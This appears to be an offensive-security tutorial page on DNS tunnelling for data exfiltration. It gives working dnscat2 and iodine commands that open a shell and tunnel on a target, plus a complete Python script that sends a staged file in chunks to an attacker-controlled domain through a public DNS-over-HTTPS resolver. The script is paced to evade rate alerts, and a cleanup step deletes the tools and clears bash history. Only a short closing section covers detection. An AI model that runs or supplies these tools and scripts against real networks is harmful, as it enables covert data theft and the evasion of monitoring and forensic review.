# DNS tunnelling

Exfiltrating data encoded in DNS queries to an attacker-controlled
authoritative DNS server. DNS traffic is permitted from almost every
network and is rarely inspected for content.

## Prerequisites

- A registered domain (the attacker's DNS server is authoritative for it)
- An authoritative DNS server that logs all queries
- Outbound DNS permitted from the target (check: `nslookup google.com` from target)
- For DoH variant: outbound HTTPS to a public DoH resolver (nearly universal)

## Classic DNS tunnelling with dnscat2

```bash
# on attacker server: start dnscat2 server
# dnscat2 encrypts the tunnel by default
ruby dnscat2.rb --dns domain=tunnel.example.com --no-cache

# on target: execute the dnscat2 client
# Windows (PowerShell)
.\dnscat2.exe tunnel.example.com --secret SECRET_KEY --delay 500

# Linux
./dnscat2 tunnel.example.com --secret SECRET_KEY --delay 500

# after connection, interactive shell:
dnscat2> session -i 1
command (target) 1> shell
dnscat2> session -i 2
```

## File exfiltration via DNS with iodine

Iodine provides a full IP-over-DNS tunnel, which is more reliable for
bulk data transfer but noisier than dnscat2:

```bash
# server setup (attacker)
iodined -f -P PASSWORD 10.0.0.1 tunnel.example.com

# client (target)
iodine -f -P PASSWORD tunnel.example.com
# creates a dns0 interface at 10.0.0.2

# once tunnel is up, use scp or rsync over it
scp /tmp/staged.zip attacker@10.0.0.1:/receive/
```

## DNS-over-HTTPS exfiltration (avoids DNS monitoring)

DoH routes DNS queries through HTTPS to a trusted resolver. The ISP or
corporate DNS monitoring sees only HTTPS traffic to Cloudflare (1.1.1.1)
or Google (8.8.8.8), not the DNS query content.

The attacker must control a domain and its authoritative DNS server.
The DoH request goes to the resolver, which forwards to the authoritative
server; the query content is logged at the authoritative server.

```python
import base64, requests, struct, time

def build_dns_query(name):
    # minimal DNS query in wire format, wrapped in DNS-over-HTTPS
    labels = name.split('.')
    qname = b''
    for label in labels:
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    # header + question section
    query = (b'\x00\x00'  # ID
             b'\x01\x00'  # flags: standard query
             b'\x00\x01'  # questions: 1
             b'\x00\x00\x00\x00\x00\x00'  # answers, authority, additional: 0
             + qname
             + b'\x00\x10'  # type: TXT
             + b'\x00\x01') # class: IN
    return query

def exfil_via_doh(chunk, seq, domain, doh='https://cloudflare-dns.com/dns-query'):
    encoded = base64.b32encode(chunk).decode().rstrip('=').lower()
    # split into 60-char labels
    labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    query_name = '.'.join([f's{seq}'] + labels + [domain])
    query_wire = build_dns_query(query_name)

    r = requests.post(doh,
        data=query_wire,
        headers={'Content-Type': 'application/dns-message',
                 'Accept': 'application/dns-message'},
        timeout=10)
    return r.status_code

# exfiltrate a file in chunks
with open('staged.zip', 'rb') as f:
    seq = 0
    while True:
        chunk = f.read(50)  # 50 bytes per query (conservative)
        if not chunk:
            break
        exfil_via_doh(chunk, seq, 'tunnel.example.com')
        seq += 1
        time.sleep(2)  # pace to avoid query rate alerts
```

## Receiving on the authoritative DNS server

The authoritative DNS server logs all queries. Extract the data from the logs:

```python
# parse dnsmasq or bind9 query logs
import re, base64

log_lines = open('/var/log/dnsmasq.log').readlines()
chunks = {}
for line in log_lines:
    # extract query name from log
    m = re.search(r'query\[TXT\] (s\d+\.[a-z2-7]+)\.tunnel\.example\.com', line)
    if m:
        query = m.group(1)
        parts = query.split('.')
        seq = int(parts[0][1:])
        encoded = ''.join(parts[1:]).upper()
        # re-pad base32
        pad = (8 - len(encoded) % 8) % 8
        chunks[seq] = base64.b32decode(encoded + '=' * pad)

# reassemble in order
with open('received.zip', 'wb') as f:
    for k in sorted(chunks.keys()):
        f.write(chunks[k])
```

## Verify and clean up

```bash
# confirm the received file is intact
md5sum staged.zip received.zip  # hashes should match

# on target: remove dnscat2/iodine client binary
rm -f dnscat2 iodine
# clear bash history
history -c
```

## Detection notes

DNS tunnelling generates:
- High query volume from a single host
- Long subdomain labels
- High entropy in subdomain portions
- Queries to a single second-level domain from a host that does not normally
  resolve that domain

DoH exfiltration is harder to detect: the queries are encrypted and go to
legitimate resolvers. Volume-based detection still applies if the DoH
traffic is significantly higher than baseline.
